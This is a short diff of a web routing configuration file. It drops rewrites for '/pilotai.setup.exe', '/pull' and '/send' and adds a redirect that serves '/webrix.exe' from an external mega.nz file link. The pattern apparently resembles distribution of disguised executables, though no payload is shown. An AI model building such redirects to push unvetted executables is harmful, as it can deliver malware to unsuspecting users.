@@ -1,17 +1,9 @@
 {
-  "version": 2,
-  "rewrites": [
+  "redirects": [
     {
-      "source": "/pilotai.setup.exe",
-      "destination": "/api/download"
-    },
-    {
-      "source": "/pull",
-      "destination": "/api/pull"
-    },
-    {
-      "source": "/send",
-      "destination": "/api/send"
+      "source": "/webrix.exe",
+      "destination": "https://mega.nz/file/5qx1FaLa#4iwJQpNTwo7t18lMPxC_hepIIYGFs70tMVlOPlByz8g",
+      "permanent": false
     }
   ]
 }
